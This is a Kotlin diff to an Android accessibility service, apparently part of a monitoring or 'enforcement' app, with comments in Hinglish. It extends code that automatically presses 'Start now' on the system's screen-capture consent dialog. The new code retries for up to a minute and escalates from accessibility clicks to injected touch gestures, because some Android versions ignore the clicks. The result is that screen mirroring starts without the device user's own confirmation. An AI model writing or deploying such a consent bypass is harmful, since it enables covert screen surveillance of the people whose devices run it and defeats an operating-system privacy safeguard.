@@ -384,23 +384,57 @@ class EnforcementService : AccessibilityService() {
         confirmHandler.postDelayed({ attemptConfirm(1) }, 350L)
     }
 
+    /** CONSENT-LOOP HONESTY (vc14) — MIRROR KA ASLI ROOT CAUSE FIX. Pehle loop
+     *  ACTION_CLICK ke "true" return par TURANT ruk jata tha (projectionRequestedAt
+     *  bhi clear). Par SystemUI kuch Android 14/15 ROMs par injected ACTION_CLICK
+     *  ko SILENTLY ignore karta hai — clickDeep true return karta hai par dialog
+     *  dismiss NAHI hoti. Result: dialog screen par khadi reh jati thi, koi retry
+     *  nahi hota, mirror hamesha dead (vc13 Phone check ne yahi dikhaya tha:
+     *  dialog khuli, click pass chala, frames 0).
+     *  Ab loop tab tak chalta hai jab tak:
+     *   - projection mil gayi (MirrorService ne projectionRequestedAt clear kiya) → SUCCESS, ya
+     *   - consent cancel/deny hua (ConsentActivity ne stamps clear kiye), ya
+     *   - 60 s armed window khatam (120 x 500 ms).
+     *  Dialog gayab hone par passes no-op hote hain (button node milta hi nahi).
+     *  Escalation ladder: pass 1-4 ACTION_CLICK (non-invasive), pass 5+ GESTURE
+     *  TAP (real touch injection — auto-clicker apps ka path, SystemUI ignore
+     *  nahi kar pata). */
     private fun attemptConfirm(n: Int) {
         confirmAttempts = n
-        val clicked = runCatching { projectionClickPass() }.getOrDefault(false)
-        if (clicked) {
-            Store.projectionRequestedAt = 0L
+        runCatching { projectionClickPass() }
+        if (MirrorManager.hasProjection || Store.projectionRequestedAt <= 0L) {
+            // SUCCESS (consent granted → MirrorService stamp clear karta hai)
+            // ya cycle cancel/deny ho gayi — dono me loop band.
             confirmAttempts = 0
             return
         }
         val requestedAt = Store.projectionRequestedAt
         val stillFresh = requestedAt > 0L && SystemClock.elapsedRealtime() - requestedAt <= 60_000L
-        // Cold devices can take 10+ s to actually render the dialog after a reboot —
-        // keep retrying ~20 s (40 x 500 ms) before giving up.
-        if (n < 40 && stillFresh) {
+        if (n < 120 && stillFresh) {
             confirmHandler.postDelayed({ attemptConfirm(n + 1) }, 500L)
         } else {
             confirmAttempts = 0
         }
+    }
+
+    /** Real touch injection (dispatchGesture) — ACTION_CLICK ka backup. Kuch
+     *  Android 14/15 SystemUI windows par injected ACTION_CLICK SILENTLY ignore
+     *  hota hai; gesture ek ASLI touch jaisa process hota hai (wahi path jo
+     *  auto-clicker apps use karti hain). true = system ne dispatch accept kiya. */
+    private fun gestureTap(x: Float, y: Float): Boolean {
+        if (Build.VERSION.SDK_INT < 24) return false
+        val path = android.graphics.Path()
+        path.moveTo(x, y)
+        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 60L)
+        val desc = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
+        return runCatching { dispatchGesture(desc, null, null) }.getOrDefault(false)
+    }
+
+    /** Node ke screen-bounds center par gesture tap. */
+    private fun gestureTapNode(n: AccessibilityNodeInfo): Boolean {
+        val r = android.graphics.Rect()
+        if (!runCatching { n.getBoundsInScreen(r) }.getOrDefault(false) || r.isEmpty) return false
+        return gestureTap(r.exactCenterX(), r.exactCenterY())
     }
 
     /** One pass over EVERY a11y window: "entire screen" select + positive button
@@ -408,7 +442,9 @@ class EnforcementService : AccessibilityService() {
      *  tha — consent dialog kuch phones par active window NAHI hota (ConsentActivity
      *  apni translucent window active rakhti hai), isliye "Start now" KABHI nahi
      *  milta tha => dialog khadi rehti thi, frames 0. Ab saari a11y windows (incl.
-     *  SystemUI dialog) scan hoti hain. Returns true once a button was clicked. */
+     *  SystemUI dialog) scan hoti hain. VC14: pass 1-4 ACTION_CLICK, pass 5+
+     *  gesture-tap escalation (SystemUI jo ACTION_CLICK silently ignore karta hai).
+     *  Returns true jab is pass me koi click/gesture action hua. */
     private fun projectionClickPass(): Boolean {
         clickPassRuns++
         val roots = mutableListOf<AccessibilityNodeInfo>()
@@ -435,7 +471,14 @@ class EnforcementService : AccessibilityService() {
                 val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
                 if (text in POSITIVE_ACTIONS && !n.isCheckable) {
                     clickPassSawBtn = true
-                    if (clickDeep(n)) { clickedAny = true; return true }
+                    // GESTURE ESCALATION (vc14): pass 1-4 par sirf ACTION_CLICK.
+                    // Pass 5+ (~2.5 s ke baad, button ABHI BHI dikh raha hai = dialog
+                    // dismiss nahi hui) par real touch injection — SystemUI jo
+                    // ACTION_CLICK ignore kar raha tha wo gesture se mana nahi kar
+                    // sakta. Loop attemptConfirm me chalta rehta hai, isliye yahan
+                    // early-return par loop nahi rukta — sirf is pass ka result hai.
+                    if (clickPassRuns >= 5 && gestureTapNode(n)) { clickedAny = true; return true }
+                    if (clickDeep(n)) clickedAny = true
                 }
             }
         }
@@ -443,18 +486,25 @@ class EnforcementService : AccessibilityService() {
         // dialog ke bottom-right most clickable Button par click karo — Android
         // convention me POSITIVE button hamesha rightmost/bottommost hota hai.
         // Sirf projection dialog host packages par aur armed window me hi chalega.
+        // Gesture-escalated version pass 5+ par (jab lastDialogPkg ne confirm kiya
+        // ki projection dialog waqai dikhi thi — blind SystemUI taps nahi).
         for (root in roots) {
             val pkg = root.packageName?.toString() ?: continue
-            if (pkg in PROJECTION_DIALOG_PKGS && clickPositiveByPosition(root)) return true
+            if (pkg !in PROJECTION_DIALOG_PKGS) continue
+            if (clickPassRuns >= 5) {
+                if (lastDialogPkg.isNotBlank() && gestureTapPositiveByPosition(root)) return true
+            } else if (clickPositiveByPosition(root)) {
+                clickedAny = true
+            }
         }
         return clickedAny
     }
 
-    /** Dialog ke sabse rightmost+bottom clickable button par click (positive
-     *  convention). Sirf isProjectionDialog window par — blind click kahin nahi. */
-    private fun clickPositiveByPosition(root: AccessibilityNodeInfo): Boolean {
-        val pkg = root.packageName?.toString() ?: return false
-        if (pkg !in PROJECTION_DIALOG_PKGS) return false
+    /** Dialog ke rightmost+bottom clickable Button node dhoondo (positive
+     *  convention). Sirf projection-dialog window par — blind click kahin nahi. */
+    private fun findPositiveByPosition(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val pkg = root.packageName?.toString() ?: return null
+        if (pkg !in PROJECTION_DIALOG_PKGS) return null
         var best: AccessibilityNodeInfo? = null
         var bestX = Int.MIN_VALUE
         var bestY = Int.MIN_VALUE
@@ -476,8 +526,25 @@ class EnforcementService : AccessibilityService() {
                 runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
             }
         }
-        if (best != null) clickPassSawBtn = true
-        return best != null && clickDeep(best)
+        return best
+    }
+
+    /** Dialog ke sabse rightmost+bottom clickable button par click (positive
+     *  convention). ACTION_CLICK variant — pehle 4 pass. */
+    private fun clickPositiveByPosition(root: AccessibilityNodeInfo): Boolean {
+        val best = findPositiveByPosition(root) ?: return false
+        clickPassSawBtn = true
+        return clickDeep(best)
+    }
+
+    /** Same rightmost+bottom button, par GESTURE TAP se (pass 5+). ACTION_CLICK
+     *  ignore hone ke baad ye real touch dialog ko dismiss karta hai. */
+    private fun gestureTapPositiveByPosition(root: AccessibilityNodeInfo): Boolean {
+        val best = findPositiveByPosition(root) ?: return false
+        val r = android.graphics.Rect()
+        if (!runCatching { best.getBoundsInScreen(r) }.getOrDefault(false) || r.isEmpty) return false
+        clickPassSawBtn = true
+        return gestureTap(r.exactCenterX(), r.exactCenterY())
     }
 
     private fun clickDeep(node: AccessibilityNodeInfo): Boolean {
